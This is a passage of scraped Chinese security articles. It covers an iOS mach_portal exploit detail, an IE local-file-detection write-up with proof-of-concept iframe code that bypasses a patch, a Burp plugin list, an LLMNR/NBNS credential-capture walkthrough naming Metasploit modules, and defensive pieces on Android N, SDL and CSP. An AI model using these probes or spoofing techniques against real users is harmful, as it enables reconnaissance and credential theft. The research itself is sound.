4, 0) )      v15 = 12;    else      v15 = 14;    v14 = v15;  }  PAGE_SHIFT_CONST = v15;iPhone 6s及之后的设备内存都是2GB，对应内核中的最小页面单位是16KB。根据zinit中的计算，ipc ports zone的页面大小是0x3000（6s之前的设备）或者0x4000（6s及之后的设备）。因此要猜测完整个页面的port需要0x49或者0x61个UAF的port。利用代码中的platform_detection也可以修改如下void platform_detection() {    uint32_t hwmem = 0;    size_t hwmem_size = 4;    sysctlbyname(""hw.memsize"", &amp;hwmem, &amp;hwmem_size, NULL, 0);    printf(""hw memory is 0x%x bytes\n"", hwmem);    if (hwmem &gt; 0x40000000)        n_ports_in_zone = 0x4000/0xa8;    else        n_ports_in_zone = 0x3000/0xa8;}","2017-01-10 15:06:03","移动安全","mach portal漏洞利用的一些细节","http://nsoad.com/Article/MobileSecurity/20170110/1007.html"
"5ccbfaf84f2f0a0a7a69c0ed","前言上个月，我们一直都在尝试弄清楚攻击者到底是如何通过检测目标系统中应用程序的相关MIME类型来对用户进行攻击的。如果目标计算机中安装了反病毒工具的话，恶意软件将拒","Kong","前言上个月，我们一直都在尝试弄清楚攻击者到底是如何通过检测目标系统中应用程序的相关MIME类型来对用户进行攻击的。如果目标计算机中安装了反病毒工具的话，恶意软件将拒绝下载恶意代码。这样一来，攻击者不仅可以保证恶意软件不会被检测工具所检测到，而且还可以在目标主机中潜伏很长的时间。当然了，所有的这一切都发生在浏览器中。虽然厂商及时修复了相关的漏洞，但我们现在仍然可以绕过补丁来实施攻击。漏洞概述今天我们要讲解的是另外一个指纹漏洞，这个漏洞将允许攻击者检测目标主机中是否存在某些类型的文件。根据Proofpoint公司的安全研究专家所透露的信息，这个漏洞是一个信息泄露漏洞，此前有很多不同的恶意广告活动和漏洞利用工具都利用了这个漏洞来实施攻击。目前，微软公司已经成功修复了这个漏洞。在2015年10月至12月期间，Proofpoint公司的安全研究专家发现了至少两个信息泄露漏洞（CVE-2016-3351和CVE-2016-3298），并且已经将漏洞细节提交给了微软公司。微软于2016年9月份修复了漏洞CVE-2016-3351，并且在2016年10月份修复了漏洞CVE-2016-3298。但不幸的是，黑客在不到一天的时间里就成功绕过了这两个补丁。利用漏洞CVE-2016-3298我们可以加载目标文件的内部资源，并通过检查类似onload/onreadystate/onerror这样的事件是否发生来检测主机中是否存在某些目标文件（exe、dll和cpl等等），这种方法也是目前攻击者最为常用的方法。实际上，IE浏览器会使用内部资源来加载信息页面、错误信息、以及某些插件图标。虽然这些资源嵌入在二进制文件之中，但是我们也可以单独加载这些资源。最常见的一个例子就是当我们尝试在IE浏览器中加载无效的URL资源时，IE浏览器会显示一个错误页面。比如说，当我们在浏览器地址栏中输入网址“http://invalidsite ”之后，IE浏览器就会将如下图所示的页面显示给我们：我们看得懂这个URL地址，但是浏览器不一定看得懂，而这个页面很明显跟我们输入的网址没有任何关系。接下来，我们可以通过检查该页面的属性来找出该页面真正的URL地址：在页面空白处点击鼠标右键，然后在弹出的菜单中选择“页面属性”，浏览器便会将关于该页面的信息显示出来： 加载资源正如我们所看到的那样，该页面的内容来自于res://ieframe.dll/dnserror.htm#http://invalidsite/，其中“res:”表示的是资源，而这是IE浏览器用来从二进制文件中加载内部资源所用的方法。默认情况下，浏览器会假设资源文件存在于目录“windows/system32”之中，但是我们也可以修改这个路径。比如说，如果我们安装了Fiddler，我们就可以轻易地找出其中的一个有效资源，并将其提供给IE浏览器。接下来，我们就可以通过检测readystate事件来查看资源是否加载成功了。如果你使用的是Resource Hacker这样的免费工具，那么你就可以直接读取到资源的名称和内容，并将它们以图片或者HTML文件的形式进行加载。为了进行简单的演示，我们在Resource Hacker中打开并查看dnserror.htm的内容，具体如下图所示：实际上，我们根本不需要通过Resource Hacker来查找有效资源，因为二进制文件中的默认资源都有固定不变的值。比如说，所有二进制文件的“文件信息”都可以通过资源“/16/1（16 == RT_VERSION）”来查找。需要注意的是，我们完全不必检索每一个需要进行测试的文件，因为我们可以直接通过加载默认资源来实现我们的目的。比如说，我们可以向Fiddler提供资源的默认信息，而下面这段指令将会触发一个readystatechange事件。res://c:\Program Files (x86)\Fiddler2\Fiddler.exe/16/1安装补丁之前的PoC为了利用这个漏洞，我们应该在一个iFrame中加载资源，并且记录下onreadystate事件被触发的次数。如果该事件被触发了一次，则说明目标文件存在；如果被触发了两次，则说明该文件不存在。关键代码如下所示，如果你愿意的话，你也可以直接下载一个可用的PoC下载地址 - 密码：infected。&lt;iframe src=""res://c:\Program Files (x86)\Fiddler2\Fiddler.exe/16/1"" onreadystatechange=""count++""&gt;&lt;/iframe&gt;  &lt;script&gt;  count = 0;  // This onload gives the iFrame a bit of time to load.// But has nothing to do with the method itselfwindow.onload = function()  {  if (count == 1) alert(""File exists!"");  else alert(""File does not exist"");}&lt;/script&gt;改进PoC上面的这个PoC在上周之前还是可以正常工作的，但是因为微软在上周修复了这个漏洞，所以我们现在就得通过其他的方法来利用这个漏洞了。首先，让我们来看一看攻击者是怎么实现的。关键代码如下图所示：在这里，恶意软件的作者使用了三种不同的技术来检测某一本地文件是否存在，但是漏洞现在已经被微软修复了。在上面这段代码中，第一个引起我注意的就是“mhtml:file”，因为即使IE禁用了“file:protocol”，但是mhtml仍然可以正常工作。于是我脑海中闪现了一个念头：虽然“mhtml:file”和“res://”已经无法使用了，但如果将mhtml和res配合使用的话，会不会产生意想不到的效果呢？如果你正在使用IE浏览器的话，你可以直接在线体验一下这个漏洞[传送门]。关键代码如下所示：&lt;iframe src=""mhtml:res://c:\Program Files (x86)\Fiddler2\Fiddler.exe/16/1"" onload=""count++""&gt;&lt;/iframe&gt;  &lt;script&gt;  count = 0;  window.onload = function()  {  if (count == 1) alert(""File exists!"");  else alert(""File does not exist"");}&lt;/script&gt;  如果你想深入了解这个漏洞和相关的补丁程序，或者你想寻找其他绕过方法的话，我建议你下载免费版的IDA，然后尝试一下我们在之前利用mimeType漏洞时所使用的方法[传送门]，你也许可以从中得到一些启发。我们现在已经知道的是，IE浏览器会非常乐意去加载类似“res://ieframe.dll”这样的东西，所以我们就可以找出这部分代码，然后看看是否能够利用这些代码来做更多有意思的事情。我直接告诉你吧，我们所要寻找的函数名为“IsIEResourcePage”。接下来，我们要修改iFrame的location，并且要与之前设置为“res://ieframe.dll”时的返回值进行对比。如果你懒得对返回数据进行手动对比的话，你也可以使用JavaScript脚本来完成这个任务。我在这里要跟大家分享一个小秘诀：当你在研究的过程中，最好使用window.open方法来修改iframe的location，尽量不要使用iframe.location。如果我们使用常规的修改方法，例如location.href和location.replace等方法，那么IE浏览器很可能会拒绝加载资源，此时浏览器将会返回一个“about:blank”页面。关键代码如下所示：&lt;iframe name=""ifr""&gt;&lt;/iframe&gt;  &lt;script&gt;  // No errors, about:blank loaded in iFrame, very slow.ifr.location = ""res://testing.dll"";  // Access Denied, nothing changes in the iFrame, super-fast.window.open(""res://testing.dll"", ""ifr"");  // This last option can be used with a try/catch creating// a battery of tests that will immediately return// the result.&lt;/script&gt;  总结没错，即使是官方发布了某一漏洞的修复补丁，也并不意味着这个漏洞就无法再被利用了。我之所以要撰写这篇文章，其中一个原因就是我想要将我所发现的东西分享给大家，以供大家学习和参考。但是我最重要的一个目的就是为了让微软公司认识到这个漏洞的严重性，希望他们能够更加重视这种类型的漏洞，并提升这类漏洞的威胁等级。攻击者就是这样，当某个漏洞“被修复”之后，他们又会立刻尝试去寻找新的漏洞利用方法。在信息安全这个领域内，这种“猫捉老鼠”的游戏几乎是永无止境的。最后，安全客祝大家挖洞愉快！","2016-10-27 00:59:30","系统安全","检测本地文件躲避安全分析","http://nsoad.com/Article/system/20161027/645.html"
"5ccbfaf84f2f0a0a7a69c0ee","项目主页https://github.com/Neohapsis/bbqsql简介SQL盲注利用是一个痛苦的过程，当有可用的工具并且正常工作时，一切都是没问题的；但当需要写一些自定义的东西时，就会非","Blackhold","0x00 前言Burp Suite 是用于攻击web 应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。所有的工具都共享一个能处理并显示HTTP 消息，持久性，认证，代理，日志，警报的一个强大的可扩展的框架。无论是收费版还是免费版，Burp Suite 这个软件都提供了一定数量的插件，这些插件极大的方便了我们平时的渗透工作。在BAPP Store中有很多开发好的插件代码，可以下载下来，安装后，在指定的目录下面会有相应的python代码或者jar包存在，这些都是很好的学习代码，推荐几个比较好用的插件：0x01 AuthMatrixAuthMatrix是一款用于检测越权漏洞的Burp Suite插件，设置好session就能进行自动化测试。项目主页：https://github.com/SecurityInnovation/AuthMatrix相似功能的插件还有：Authz。Authz会先访问一遍接口抓包，然后“Send request(s) to Authz”，设置低权限的cookie，“Run”就会使用低权限的cookie去请求，结果会匹配给出相似度百分比，可以查看每个请求的详细。半自动测试。0x02 J2EEScanJ2EEScan是一个基于web安全扫描套件Burp Suite Proxy的插件， 增加了针对J2EE应用的安全扫描测试项目。它增加了一些新的测试用例和新策略去发现不同的J2EE安全漏洞。项目主页：https://github.com/ilmila/J2EEScan0x03 activeScan++该插件主要是在主动扫描和被动扫描时，为了增强扫描漏洞效果。增加了一些本身自动化扫描没有的漏洞检查。项目主页：https://github.com/albinowax/ActiveScanPlusPlus0x04 LFI scanner checksLFI scanner checks是国人为burp轻量级扫描器做的一个检测LFI漏洞插件。链接: http://pan.baidu.com/s/1cqW4VG 密码: 6y1d0x05 BypassWAF我们在渗透测试有时遇到WAF（应用层防火墙），这往往令人头疼。Burp Suite是响当当的web应用程序渗透测试集成平台，而这款插件可以帮助你绕过某些WAF。未来功能：自动在GET/POST实现HPP攻击测试自动进行HTTP Request Smuggling攻击项目主页：https://github.com/codewatchorg/bypasswaf0x06 s1riu5TheFloorburpsuite和sqlmap是渗透测试中最常用到的两大神器。最常用的功能是利用burpsuite拦截http请求，然后用sqlmap的r参数读取。s1riu5TheFloor就是一款联动burpsuite和sqlmap的插件。缺点：适用于Mac，没做跨平台适配项目主页：https://github.com/5ir1us/Tarot/tree/master/s1riu5TheFloor相似功能的插件还有CO2。该插件包含诸多功能，如SQLMapper、User Generator、Prettier JS、ASCII Payload Processo、Masher 等功能。但是调用的不是sqlmap的r参数，而是u参数，无法实现对http请求的全部利用。0x07 BurpKit插件BurpKit提供了双向JavaScript桥梁API，允许用户在同一时间迅速创建能够直接与DOM交互的BurpSuite插件，以及Burp的扩展API。此举让BurpSuite插件开发人员得以直接在DOM自身运行他们的web应用程序，在检测自身逻辑的同时还可以利用BurpSuite的其他功能。项目主页：https://github.com/allfro/BurpKit/releases0x08 CSRF ScannerCSRF Scanner是一款CSRF漏洞的测试工具，主动扫描CSRF漏洞问题，主要是了加强burpsuite中的CSRF扫描功能。可以从“ Bapp Store” 界面左侧选择” CSRF Scanner”, 导航到右侧点击“ install”来进行安装0x09 s1riu5TheMagicians1riu5TheMagician是一款信息采集插件。支持C段端口扫描、子域名查询、敏感文件扫描等功能项目主页：https://github.com/5ir1us/Tarot/tree/master/s1riu5TheMagician0x10 Java-Deserialization-ScannerJava-Deserialization-Scanner是一个BurpSuite的插件，用来自动化的发现java反序列化漏洞项目主页：https://github.com/federicodotta/Java-Deserialization-Scanner0x11 CSP-BypassCSP-Bypass是一个使用Python编写的一个Burp插件，他可以使用已知道的方法去尝试网站CSP的安全性，是否能够绕过。项目主页：https://github.com/moloch–/CSP-Bypass0x12 JSON DecoderJSON Decoder可以将json数据格式化，比较方便查看。可以从“ Bapp Store” 界面左侧选择” JSON Decoder”, 导航到右侧点击“ install”来进行安装0x13 Additional Scanner ChecksAdditional Scanner Checks是一款PDF元数据被动扫描插件，用于检查PDF文件项目主页：https://github.com/luh2/PDFMetadataBurpsuite插件收集项目项目主页：https://github.com/xl7dev/BurpSuite/tree/master/Extender提供了大量实用的Burpsuite插件BurpSuite 的 Intruder Payloads：项目主页：https://github.com/1N3/IntruderPayloads","2016-10-14 04:40:11","安全工具","BurpSuite中的安全测试插件推荐","http://nsoad.com/Security-tools/20161014/tools-556.html"
"5ccbfaf84f2f0a0a7a69c0ef","Android N安全特性概览 AndroidN即Android7.0，代号“牛轧糖”，是Google于2016年7月份推出的最新版智能手机操作系统。AndroidN带来了诸多新特性与功能，它们将对","Kong","Android N安全特性概览 AndroidN即Android7.0，代号“牛轧糖”，是Google于2016年7月份推出的最新版智能手机操作系统。AndroidN带来了诸多新特性与功能，它们将对系统整体性能进行提升，特别对安全性进行了强化。图1给出了AndroidN带来的主要变更，一方面，AndroidN对部分原有功能进行了优化，如应用程序编译、电池与内存管理、通知功能、无障碍功能等；另一方面，AndroidN也引入了诸多新特性，如多窗口支持与VulkanAPI等。图1Android N主要行为变更AndroidN的诸多新特性归根结底是为了增强系统安全性、提升用户体验。为了应对层出不穷的恶意木马和不断完善Android系统安全机制，Google还对Android系统的安全性进行了诸多优化，这些优化主要涉及系统权限、应用间文件共享以及Androidfor Work三方面的内容：1.系统权限变更 弃用GET_ACCOUNTS权限。AndroidN之前，开发者通过AccountManager的getAccounts()方法获取设备上账户信息之前必须保证已申请GET_ACCOUNTS权限；而AndroidN弃用了该权限，开发者可以在不申请GET_ACCOUNTS的情况下访问设备上的账户信息。 新增OPEN_EXTERNAL_DIRECTORY行为。与原先申请WRITE_EXTERNAL_STORAGE权限后即可写外部存储不同的是，在AndroidN中，开发者首先需要通过该Action在外部存储中申请创建一个可写目录，方可对外部存储进行写操作，这种方式进一步加强外部存储的安全性能。2.应用间文件共享应用私有目录被限制访问（0700），文件所有者将无法通过设置私有文件访问模式为MODE_WORLD_READABLE与MODE_WORLD_WRITEABLE来开放私有文件的读写权限；此外，通过file:///URI也将无法访问到应用包之外的路径；同时DownloadManager将不能通过文件名来共享私有文件的信息。若要在应用间共享文件，开发者可以发送一项content://URI，并授权URI的临时访问权限。进行此授权的最简单方式是使用FileProvider类。这一改变有效确保了共享文件的安全问题。3.Android for Work主要涉及证书安装、重置密码、二级用户管理以及设备标识符访问权限的变更；除了上述三个方面外，AndroidN还引入了新的开机验证机制，在设备开机时首先会验证系统文件完整性，一旦检测到系统文件被篡改（或者是引导镜像存在被修改的痕迹），则禁止系统启动或限定部分功能（实际上在AndroidM时代，系统也会进行完整性检查，但AndroidM在检测到系统被篡改时只是以弹窗形式提醒用户，而不会采取进一步措施）。AndroidN的新开机验证机制将直接影响到设备Root的困难程度，因为在Root过程中通常以修改系统文件的方式来提升用户权限。从这个角度来看，新的开机验证机制在某种程度上提高了系统的安全性。AndroidN在用户层与系统层上的安全机制调整增强了设备的安全性。在系统层面，通过限制对私有文件的访问，强化了应用间的隔离效果，进一步保护了应用程序私有数据的安全；在用户层面，通过严控证书安装流程、限制重置密码等操作来降低由非法证书、锁屏勒索类木马带来的威胁。我们以Androidfor Work对锁屏勒索类木马发展趋势产生的影响为例来深入分析安全新特性。锁屏勒索类木马现状锁屏勒索类木马是让Android用户头疼的恶性问题之一，网络上也频频爆出Android用户遭遇各类锁屏勒索的新闻及其引发的相关讨论。图2Android锁屏勒索问题频现Android手机锁屏勒索类木马主要是通过操作用户开机密码从而强制锁定用户手机，使得用户无法正常使用手机，并以此威胁用户进行付费解锁，用户只需按照恶意软件的提示进行指定操作。从技术角度看，锁屏勒索类木马主要利用了特殊悬浮窗、Activity劫持、屏蔽虚拟按键、设置手机PIN码和修改系统文件等方式以达到强制多屏的效果。2016年前三个季度捕获锁屏勒索类木马11.1万余个，与2015年同季度对比发现，2016年一季度呈现出爆发式增长，同比增长767%；2016年二季度同比增长360%；2016年三季度同比增长56%，如图3所示。由图4可以看到，直接与重置密码相关的锁屏勒索类木马在这类木马中占了很大比重。这既足以反映出锁屏勒索类木马已成为Android安全的重灾区，也表现出重置密码是这类木马的最常采用的手段，同时这类木马展现的巨大利益诱惑吸引着大量的木马作者，无形中给广大用户带来了巨大的安全隐患。图32015和2016年同季度Android锁屏勒索类木马数量对比图4锁屏勒索木马中设置锁屏密码勒索木马占比重置密码特性变更图5给出了一个Android手机上的锁屏勒索类木马示例，可以看出木马运行后首先会要求获取设备管理权限，用户按要求激活设备管理器后则会发现手机立刻被强制锁屏，并且锁屏界面出现了“提示性”语句，用户根据“提示性”信息向指定账户支付一定金额后才能取得新密码解锁进入手机桌面。图5Android锁屏勒索木马示例1.锁屏勒索类木马实现重置密码Android N之前，通过操作设备管理器可以很容易地实现重置密码，只需调用设备管理器DevicePolicyManager提供的resetPassword(Stringpassword, int flags)接口，其中password为新的密码。图6所示为勒索木马重置密码的代码：首先需要为设备管理器添加reset-password动作，然后只要监听到用户激活设备管理器便立即调用resetPassword接口进行重置密码进而锁定用户的手机，如图6所示。图6勒索软件示例代码2.Android N中的resetPassword接口与Android N之前版本可任意设置或重置设备密码不同的是，AndroidN中明确规定，第三方应用开发者只能使用DevicePolicyManager.resetPassword为无密码设备设置初始密码，而不能重置或清除已有的设备密码。若设备当前没有密码，如图7（  左）所示，此时可以调用resetPassword方法成功设置锁屏密码，如图7（右）。图7成功设置密码若设备已有密码，当尝试调用resetPassword方法重置锁屏密码时，系统会抛出SecurityException异常，并提示“Admincannot change current password”，如图8所示。图8修改已有密码失败从上述内容可以看到，AndroidN中对于resetPasswordAPI所添加的限制能阻止木马对已有锁屏密码的重置，从而使得部分勒索软件失效。小结1.在Android N中，锁屏勒索类木马只能利用系统提供的重置密码API来设置设备的初始密码，而不能用来修改已有密码，这也就意味着那些从不设锁屏密码的用户仍然会处在危险之中，由此可见用户养成主动设置锁屏密码等良好习惯对提高设备安全性而言非常重要；2.由于在针对Android N以下版本的锁屏勒索类木马中，重置密码相关的木马占比较大，因此AndroidN对该API的使用限制将会大幅缩小锁屏勒索类木马的影响范围；3.面对此种对重置密码功能的限定，锁屏勒索类木马可能会另辟蹊径，比如结合伪装、诱导等其他手段来扰乱用户正常使用设备，以达到敲诈勒索的目的。对此我们会继续关注，让用户更安全地使用手机。","2016-11-11 16:30:22","移动安全","Android N限制重置密码以遏制勒索软件","http://nsoad.com/Article/MobileSecurity/20161111/744.html"
"5ccbfaf84f2f0a0a7a69c0f0","文：ayazero        在安全领域，安全开发过程SDL和入侵检测完全是两件事，似乎是两个不能拿来直接比较的东西。之所以硬是把两个东西放在一起比较是基于以下的命题：手中资","root","文：ayazero        在安全领域，安全开发过程SDL和入侵检测完全是两件事，似乎是两个不能拿来直接比较的东西。之所以硬是把两个东西放在一起比较是基于以下的命题：手中资源恒定的情况下，投入在SDL上更有效，还是投入在入侵检测上回报更高。在《互联网企业安全高级指南》中提过对于安全负责人来说，整个决策都是基于投资回报的。（注：安全负责人不等于安全管理岗位，后者跟产品经理一样只是一个岗位名称，而前者至少等价于一个公司总监或VP级的分支领域管理者）传统的观点肯定是从源头去解决问题，即通过SDL从开发过程把漏洞率降到最低，不只是解决编码级别的漏洞，同时通过威胁建模和安全设计解决架构级别的漏洞。这种观点基于的背景是出现了漏洞早晚是要修的，与其被动救火，不如在生命周期的前端卡位，晚修不如早修。入侵检测是运维环节的事情，是对网络基础架构、系统、容器、应用、数据在线实时状态的判断，入侵检测能做到的效果是：根据局部或大面积的入侵和被利用的状态反推漏洞的出处，最后去修补。从过程视角看，它并不覆盖研发过程，跟漏洞修补是脱节的。回来看SDL的起源，SDL起于微软，对微软而言，过去是一家软件公司，现在转身云计算，它的生态从底层操作系统，开发工具，上层数据库和应用都是自己开发的，有漏洞也都是自己研发的产品的漏洞，所以SDL对这种模式特别有效，大部分漏洞都需要在研发环节消化掉。但是反观互联网在线服务，云计算领域的安全，整个生态中，对大多数厂商而言自己研发的产品可能只占一部分，有相当大的漏洞比例可能是诸如Xen，Linux，PHP，Nginx，MySQL，Struts等，这些漏洞修补都变成了运维环节的事情，根本不在SDL的范围之内。即SDL做到100分也解决不了运行时系统上的那些漏洞。你可能猜到我想说什么了，不过上面的原因还仅仅是其中一部分。更深层次的需求是：大规模互联网在线服务的安全防护需要做到一切有害行为可及时感知，一切攻击和入侵产生的破坏影响可控。具体解释一下这句话：1.大量的踩点，有目的或无目的的扫描这些可以“不感知”，因为这里面垃圾信息太多，但对于踩进自己防御圈内的每一步都应该有感知，包括扫描时找到了有效的SQL注入点，尽管还没开始“正式利用”，但对防御体系建设者来说应该是需要知道的，之后例如上传和生成webshell或类似于killchain等每一步都必须有感知。2.只要攻击者没拿走用户数据，即便完成了前述所有步骤，而在最后一步之前把对方压制并赶出自己的防卫圈就算安全工作60分了，因为没有造成实质伤害，但需要忙乎一阵。3.也基于此，即使很多产品带着漏洞上线，即使漏洞被利用了能第一时间感知并立刻采取修补行动，即便Struts漏洞没有补丁在线裸奔，有人利用了被渗透了也能即时感知和阻断，这样就能做到整体风险可控。但是同样的，即便你SDL做到了100分，这些东西仍然高度不可控。基于这种思路以上就构成了分层防御，一切可控的安全运维体系，前提是有一套强大的入侵感知系统。现实生活中不存在SDL和入侵检测只选一头的情况，用极端状况下只选一头这个问题是帮助理解实际的安全工作思路。写到这里，再问一遍，极端状况下，SDL和入侵检测只能选一个，你选哪个？答案是：对于云安全，互联网服务，选入侵检测，它的不足是于当漏洞数量过多时，修补会比较吃力，尤其是架构级漏洞。对于传统软件研发，选SDL，显然这个更有效。末了，撇开这个问题回到现实场景中应该是两者并重，但投入比例和优先级上面已经说了。原文SDL.vs.入侵检测，源头和末端选哪头 作者ayazero","2016-09-24 02:05:42","安全管理","SDL.vs.入侵检测，源头和末端选哪头","http://nsoad.com/news/securityissue/20160924/440.html"
"5ccbfaf84f2f0a0a7a69c0f1","哈希长度扩张攻击（hash length attack）是一类针对某些哈希函数可以额外添加一些信息的攻击手段，适用于已经确定哈希值和密钥长度的情况。这里推荐有python扩展的HashPump","blackhold","作为一名渗透测试人员,我想做的第一件事是获取一个内部网络的系统访问权限。为了达到这个目的,其中一种方法是对NetBIOS-NS或它的前身LLMNR广播消息做出应答,告诉请求主机我们的攻击者主机就是它们想要连接的主机。那么NetBIOS-NS和LLMNR是什么呢?NetBIOS和LLMNR都是在DNS失败时用于识别一个网络中的主机的服务。当一个网络上的主机不能通过DNS解析主机名的IP地址时,LLMNR和NetBIOS就会向网络发送广播消息询问网络上所有主机这个主机名是否是它们最初请求的。作为一个攻击者,我们所要做的就是倾听这些请求,然后做出应答,告诉请求主机(受害者)它们正在寻找的是我们的攻击者机器,并获取它们的连接请求。攻击方法Metasploit有两个模块是我喜欢用的,我经常用来捕捉受害者机器请求连接时发送的凭证:auxiliary/server/capture/http_ntlmauxiliary/server/capture/smb这两个模块在我们的攻击者机器上设置监听服务来对SMB和HTTP 做出应答,从而获取NTLM / LM哈希表。我们需要做的是请求受害者机器的这些连接,并引导它们到我们的攻击者机器上来,然后我们就可以捕获这些包含NTLM / LM哈希表的请求。这可以通过Metasploit的下面两个模块来实现:auxiliary/spoof/llmnr/llmnr_responseauxiliary/spoof/nbns/nbns_response我建议你深入了解这些模块的选项,并理解每一个的功能和使用方法,这在本文中并未涉及。在下面的图1中,你会注意到我有两个虚拟机。左边的虚拟机是我的攻击者机器,运行Metasploit框架。右边的Windows7虚拟机是受害者的机器。这些虚拟机都运行在本地网络上,所以在虚拟机网络内它们是逻辑上相邻的。在攻击者机器上的Metasploit框架内我已经做了以下设置:所有四个模块都已经设置和配置为侦听或响应传入的广播消息,我可以用我的受害者主机Windows7虚拟机来模拟一台主机试图访问网络资源。图1:获取哈希表补救措施NetBIOS-NS和LLMNR:应该注意的是,考虑到足够的密码强度,这种形式的攻击不一定会获得访问权限。因此Rapid7建议,第一步是确保所有账户都配置了强密码,然后考虑在所有Windows主机上禁用NetBIOS和LLMNR协议。禁用这些协议将限制黑客用来执行一个恶意攻击或捕获Windows身份验证流量的能力。对于XP主机或者更老的机器,可以在每个Windows主机的网络适配器属性中禁用NetBIOS。对于Windows 7以上的机器,可以通过组策略来禁用LLMNR协议。最后,在部署生产环境之前,确保安全配置标准都已经正确应用到了所有桌面系统中。如果桌面系统不存在安全配置标准,那么,请为它们创建。Metasploit并不是唯一拥有这个功能的工具。SpiderLabs的开源工具responder.py是另一个可以利用NetBIOS-NS和LLMNR中这个漏洞的工具。Wesley McGrew的工具nbnspoof.py是一个古老的对NetBIOS-NS进行欺骗/施毒的学校工具。捕获NTLM / LM哈希表是试图访问网络的比较重要的第一步。我在这篇文章中列出的Metasploit的两个辅助服务模块都有一个设置,该设置可以将捕获的哈希表写成Cain &amp; Able或John the Ripper的格式,从而更容易地对捕获的哈希表进行进一步的破解。","2016-08-01 00:18:19","Web安全","真实环境中的渗透测试：在内网捕捉信用凭证","http://nsoad.com/Article/web/20160801/236.html"
"5ccbfaf84f2f0a0a7a69c0f2","近日微软研究人员Itay Grady和Tal Be&rsquo;ery发布了Powershell脚本Net Cease，它可以防止攻击者在企业内网中获取到突破点后，继续横向扩展获取敏感信息。Net Cease的作用","Kong","近日微软研究人员Itay Grady和Tal Be’ery发布了Powershell脚本Net Cease，它可以防止攻击者在企业内网中获取到突破点后，继续横向扩展获取敏感信息。Net Cease的作用在Net Cease在目标机器上部署后，非管理用户想要远程调用NetSess时就会被阻止。这种类型的手法，一般是通过执行SMB会话枚举，借助NetSessionEnum方法去探测域控DC，然后再获取其他目标的信息。事实上，现在已经有渗透工具能实现这种自动化的信息探测。然而Net Cease则会修改默认的NetSessionEnum方法的权限，限制能远程执行该方法的域用户数量。开发者解释道：“NetCease脚本提升了NetSessionEnum的访问门槛，它会移除认证用户组的执行权限，并且为交互、服务和批处理登陆会话添加权限。Net Cease使用后的结果管理员和系统操作员和power用户是能够远程调用NetSessionEnum方法的。另外，任何交互、服务和批处理登陆会话也可以本地调用它。”值得一提的是，Net Cease脚本在win7/8/10和windows server 2003/2008/2012系统上，能够非常良好地运行。研究人员补充道：“注意，强化后的NetSession并不会妨碍防火墙检测攻击的能力，MicrosoftATA也会检查失败的探测尝试。”下载地址戳这里。","2016-11-03 18:29:00","安全工具","Net Cease：微软研究员研发的反探测工具","http://nsoad.com/Security-tools/20161103/tools-692.html"
"5ccbfaf84f2f0a0a7a69c0f3","0x01 CSP 介绍CSP[0] 是由单词 Content Security Policy 的首单词组成，CSP旨在减少 (注意这里是减少而不是消灭) 跨站脚本攻击。CSP是一种由开发者定义的安全性政策性申明，","Kong","0x01 CSP 介绍CSP[0] 是由单词 Content Security Policy 的首单词组成，CSP旨在减少 (注意这里是减少而不是消灭) 跨站脚本攻击。CSP是一种由开发者定义的安全性政策性申明，通过 CSP 所约束的的规责指定可信的内容来源（这里的内容可以指脚本、图片、iframe、fton、style等等可能的远程的资源）。通过CSP协定，让WEB处于一个安全的运行环境中，目前 CSP 已经到了 3.0 阶段。现代浏览器目前都可以通过获取 Header 头来进行 CSP 配置，E.g php Set Header： &lt;?php header(""Content-Security-Policy: default-src  'self'; script-src 'self' server.n0tr00t.com;"");Content Security Policy 1.0 各浏览大致支持情况表格：Content Security Policy 1.0 各浏览具体支持情况图[1]：指令参考：指令         说明default-src 定义资源默认加载策略connect-src 定义 Ajax、WebSocket 等加载策略font-src    定义 Font 加载策略frame-src   定义 Frame 加载策略img-src 定义图片加载策略media-src   定义 &lt;audio&gt;、&lt;video&gt; 等引用资源加载策略object-src  定义 &lt;applet&gt;、&lt;embed&gt;、&lt;object&gt; 等引用资源加载策略script-src  定义 JS 加载策略style-src   定义 CSS 加载策略sandbox 值为 allow-forms，对资源启用 sandboxreport-uri  值为 /report-uri，提交日志Source List Reference[2]：0x02 规则示例注：多个指令用分号进行分割；多个指令值使用英文空格分割；指令值在非域名时左右须使用引号包含；指令重复的话将以第一个为准；1.定义所有类型资源为默认加载策略，允许执行加载 自身及 test.n0tr00t.com 的 JS 资源：    Content-Security-Policy: ""default-src 'self'; script-src 'self' test.n0tr00t.com""    X-Content-Security-Policy: ""default-src 'self'; script-src 'self' test.n0tr00t.com""    X-WebKit-CSP: ""default-src 'self'; script-src 'self' test.n0tr00t.com""2.禁止 frame ，允许所有图像，Style Self，允许执行加载所有 n0tr00t.com 域下的 JS 资源：Content-Security-Policy: ""script-src *.n0tr00t.com; style-src 'self'; img-src *; frame-src 'none'"" X-Content-Security-Policy: ""script-src *.n0tr00t.com; style-src 'self'; img-src *; frame-src 'none'""X-WebKit-CSP: ""script-src *.n0tr00t.com; style-src 'self'; img-src *; frame-src 'none'""3.Content-Security-Policy-Report-Only 收集日志报告：    Content-Security-Policy-Report-Only: script-src 'self'; report-uri http://linux.im/test/csp/report    LogResult:    {        ""csp-report"": {            ""document-uri"": ""http://linux.im/csp.php"",            ""referrer"": ""test ref"",            ""violated-directive"": ""script-src 'self'"",            ""original-policy"": ""script-src 'self'; report-uri http://linux.im/test/csp/report"",            ""blocked-uri"": """"        }    }4.允许执行内联 JS 代码，但不允许加载外部资源：Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';另外我们也可以使用在线生成 CSP 规则的站点来辅助编写：http://cspisawesome.com/0x03 预加载在 HTML5 中的一个新特性：页面资源预加载(Link prefetch)[3]，他是浏览器提供的一个技巧，目的是让浏览器在空闲时间下载或预读取一些文档资源，用户在将来将会访问这些资源。一个Web页面可以对浏览器设置一系列的预加载指示，当浏览器加载完当前页面后，它会在后台静悄悄的加载指定的文档，并把它们存储在缓存里。当用户访问到这些预加载的文档后，浏览器能快速的从缓存里提取给用户。这种做法曾经被称为 Prebrowsing ，可以细分为几个不同的技术：DNS-prefetch、subresource 和标准的 prefetch、preconnect、prerender ，并不是像很多人想象的那样，只有 Chrome 才支持预加载，目前绝大多数的浏览器都已支持。HTML5 页面资源预加载/预读取(Link prefetch)功能是通过Link标记实现的，将 rel 属性指定为 prefetch ，在 href 属性里指定要加载资源的地址即可。例如：Chrome, Firefox ：&lt;link rel=""prefetch"" href=""http://linux.im/test_prefetch.jpg""&gt;  Chrome 预渲染（不要滥用！对地址所有资源进行提前渲染，如未使用的话则会白白浪费渲染资源。）:&lt;link rel=""prerender"" href=""http://linux.im""&gt;  DNS 预解析 